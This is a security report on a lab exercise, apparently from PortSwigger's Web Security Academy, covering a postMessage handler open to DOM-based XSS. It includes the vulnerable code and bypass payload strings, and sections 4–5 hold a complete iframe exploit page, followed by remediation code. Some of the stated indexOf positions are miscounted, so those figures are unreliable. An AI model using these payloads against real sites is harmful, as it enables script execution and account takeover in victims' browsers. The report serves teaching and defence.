# Vulnerability Report: DOM-Based XSS via Insecure postMessage Handler

**Severity:** High  
**CVSS v3.1 Score:** 8.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-346 (Origin Validation Error)  
**Finding Type:** DOM-Based Cross-Site Scripting (XSS)  
**Test Environment:** PortSwigger Web Security Academy Lab  

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Vulnerability Details](#3-vulnerability-details)
4. [Attack Flow](#4-attack-flow)
5. [Exploitation Logic](#5-exploitation-logic)
6. [Impact Assessment](#6-impact-assessment)
7. [Real-World Context](#7-real-world-context)
8. [Secure Remediation Guidance](#8-secure-remediation-guidance)
9. [References](#9-references)

---

## 1. Executive Summary

A DOM-based Cross-Site Scripting (XSS) vulnerability was identified in the client-side message handler of the target application. The application listens for cross-origin `postMessage` events and uses attacker-controlled data to set `location.href` without adequate sanitization. The only validation in place — a substring check for `http:` or `https:` — is trivially bypassed by embedding the required string as a comment within a `javascript:` URI.

An attacker can host a malicious page that, when visited by an authenticated user, delivers a crafted `postMessage` to the target origin, causing arbitrary JavaScript execution in the victim's browser context.

---

## 2. Root Cause Analysis

### Vulnerable Code

```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

### Root Cause: Three Compounding Failures

#### Failure 1 — No Origin Validation

The handler accepts messages from **any origin**. The `MessageEvent` object exposes `e.origin`, which identifies the sender's domain. Failing to check it means any page on the internet can `postMessage` to this listener.

```javascript
// What's missing:
if (e.origin !== 'https://trusted-origin.com') return;
```

#### Failure 2 — Allowlist Logic Implemented as Substring Match

The developer intended to permit only HTTP/HTTPS URLs. However, `String.indexOf()` checks for substring *presence*, not URL *scheme*. It does not assert that `http:` or `https:` appears at position 0 (the start of the string). Any string *containing* `http:` anywhere — including inside a comment — passes the check.

```javascript
// These all pass the check:
"javascript:alert(1)//http:"          // indexOf('http:') = 22 → passes
"javascript:void(0)/*https://x*/"    // indexOf('https:') = 20 → passes
"data:text/html,<script>...</script>//http:" // also passes
```

#### Failure 3 — Unsafe Sink: `location.href`

`location.href` is a **JavaScript execution sink** when assigned a `javascript:` URI. Unlike `location.href = 'https://example.com'` (a navigation), `location.href = 'javascript:print()'` executes arbitrary code in the current page's context. This is not a navigation — it is code execution.

---

## 3. Vulnerability Details

| Property | Value |
|---|---|
| **Source** | `e.data` (postMessage payload, attacker-controlled) |
| **Sink** | `location.href` (javascript: URI execution) |
| **Bypass Method** | Embed `http:` as a URI comment after the JS payload |
| **Origin Check** | None — any cross-origin sender accepted |
| **Affected Component** | `window` message event listener (client-side JS) |
| **Authentication Required** | No |
| **User Interaction Required** | Yes — victim must visit attacker-controlled page |

---

## 4. Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│  ATTACKER INFRASTRUCTURE                                        │
│                                                                 │
│  Hosts malicious page with:                                     │
│  <iframe src="https://victim.com/"                              │
│    onload="this.contentWindow.postMessage(                      │
│      'javascript:print()//http:','*')">                         │
│  </iframe>                                                      │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         │  1. Victim visits attacker page
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  VICTIM'S BROWSER                                               │
│                                                                 │
│  2. iframe loads victim.com                                     │
│  3. onload fires → postMessage('javascript:print()//http:','*') │
│     sent to iframe's contentWindow (victim.com)                 │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         │  4. Message received by victim.com's listener
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│  VICTIM.COM (inside iframe)                                     │
│                                                                 │
│  5. e.data = 'javascript:print()//http:'                        │
│  6. indexOf('http:') returns 22 → condition TRUE                │
│  7. location.href = 'javascript:print()//http:'                 │
│  8. Browser executes: print()    (// starts comment, ignores    │
│     everything after)                                           │
│                                                                 │
│  ✅ Arbitrary JS executes in victim.com's origin context        │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. Exploitation Logic

### The Payload Dissected

```
javascript:print()//http:
│           │       │
│           │       └─ URI fragment comment — satisfies indexOf('http:') check
│           │          Everything after // is ignored by the JS engine
│           └─ The actual JavaScript to execute
└─ URI scheme — tells the browser: "execute what follows as JavaScript"
```

### Why `javascript:` Works as a URI Scheme

When a browser processes `location.href = 'javascript:<expression>'`, it:

1. Recognises the `javascript:` pseudo-scheme
2. Evaluates `<expression>` in the **current page's execution context**
3. If the result is a string, uses it as the new document body (otherwise no navigation occurs)

This is the same mechanism used by browser bookmarklets. It is **not** a navigation event — it is synchronous code execution.

### Why `//http:` Bypasses the Filter

In JavaScript URI syntax, `//` begins a single-line comment. The engine evaluates:

```javascript
print()   // ← executes
//http:   // ← ignored, it's a comment
```

Meanwhile, `"javascript:print()//http:".indexOf('http:')` returns `22` — greater than `-1` — so the `if` condition is satisfied. The filter is fooled.

### Exploit Page (Full)

```html
<!-- Hosted on attacker-controlled server -->
<iframe
  src="https://victim.com/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')"
></iframe>
```

**Why `this.contentWindow` and not `window.opener`?**

- `this.contentWindow` — the parent frame pushing a message *down* to its child iframe. Valid here because the attacker's page IS the parent.
- `window.opener` — a page pushing a message *up* to the window that opened it via `window.open()`. Not valid here — no opener relationship exists.

**Why `'*'` as targetOrigin?**

Passing `'*'` means the message is delivered regardless of the iframe's current origin. In a real engagement, specifying the exact target origin is more precise and avoids delivery failures due to redirects. However, `'*'` confirms the vulnerability works regardless of origin restrictions on the sender side.

---

## 6. Impact Assessment

If exploited in a real application (not a lab), this vulnerability would allow an attacker to:

| Impact | Detail |
|---|---|
| **Session Hijacking** | `document.cookie` exfiltrated to attacker server |
| **Credential Theft** | Fake login overlay injected into the DOM |
| **Account Takeover** | Authenticated API calls made on victim's behalf |
| **Malware Distribution** | Redirect to drive-by download or phishing page |
| **DOM Manipulation** | Full page content replaced or defaced |
| **Keylogging** | `addEventListener('keypress')` installed silently |

Because execution occurs in the **victim origin's context**, all same-origin resources — cookies, localStorage, IndexedDB, in-flight XHR tokens — are accessible to the injected script.

**Chaining potential:** This vulnerability is particularly valuable when chained with CSRF-protected endpoints, since the attacker gains full same-origin execution without needing to bypass CSRF tokens.

---

## 7. Real-World Context

### How This Arises in Production

`postMessage` is widely used for legitimate cross-origin communication: OAuth popup callbacks, embedded widgets (chat, payment forms, analytics), third-party iframe integrations. Developers implementing these patterns often:

1. Write URL validation that works for the happy path but ignores adversarial input
2. Copy-paste listener patterns from Stack Overflow without origin validation
3. Assume `location.href` is "just navigation" and do not treat it as a sink
4. Trust that `http:`/`https:` presence is sufficient to exclude `javascript:` URIs

These assumptions are systematically wrong against an attacker with control over `postMessage` senders.

### Why Developers Miss This

The flaw reads as intentional security logic. The code *looks* like it's doing URL validation. Without understanding that:
- `indexOf` does not enforce position
- `javascript:` URIs can contain arbitrary strings as comments
- `location.href` is a code execution sink

...a developer reading this code will see a check that "only allows http/https links."

---

## 8. Secure Remediation Guidance

### Fix 1 — Validate `e.origin` (Mandatory)

```javascript
window.addEventListener('message', function(e) {
    // Reject messages from untrusted origins
    if (e.origin !== 'https://trusted-partner.com') return;

    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

This alone significantly reduces the attack surface, but is **not sufficient on its own** — a compromised trusted origin could still send malicious messages.

### Fix 2 — Validate URL Scheme Correctly (Defense in Depth)

Replace substring matching with explicit scheme validation using the URL API:

```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted-partner.com') return;

    try {
        var parsed = new URL(e.data);
        // Allowlist only safe schemes
        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
            console.warn('Blocked non-http URL:', e.data);
            return;
        }
        location.href = parsed.href;
    } catch (err) {
        // Invalid URL — reject silently
        console.warn('Invalid URL received via postMessage:', e.data);
    }
}, false);
```

`new URL(e.data).protocol` parses the actual URI scheme — it will return `'javascript:'` for `javascript:` URIs, which fails the allowlist check. This cannot be bypassed with comment tricks.

### Fix 3 — Avoid `location.href` for Cross-Origin Data (Preferred)

If the use case only requires navigating to known application routes, don't assign raw URLs from messages. Use a server-side redirect endpoint or a route allowlist:

```javascript
const ALLOWED_PATHS = ['/dashboard', '/profile', '/settings'];

window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted-partner.com') return;

    if (ALLOWED_PATHS.includes(e.data)) {
        location.href = e.data; // Safe: only known paths
    }
}, false);
```

### Fix Summary

| Control | Prevents |
|---|---|
| `e.origin` check | Unauthenticated cross-origin message injection |
| `new URL().protocol` validation | `javascript:`, `data:`, `vbscript:` URI injection |
| Path allowlist | Open redirect and unexpected navigation |
| Avoid `location.href` as sink | Entire class of URL-based JS execution |

**Recommendation:** Apply all four controls. Defense-in-depth is appropriate here because the root failure is architectural (trusting cross-origin input without layered validation), not just a single missing check.

---

## 9. References

- [OWASP: DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [OWASP: Testing for Client-side postMessage](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger: postMessage-based DOM XSS](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)
- [MDN: Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [MDN: javascript: URLs](https://developer.mozilla.org/en-US/docs/Web/URI/Schemes/javascript)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)

---

*Report prepared as part of authorized security assessment. All exploitation performed in isolated lab environment.*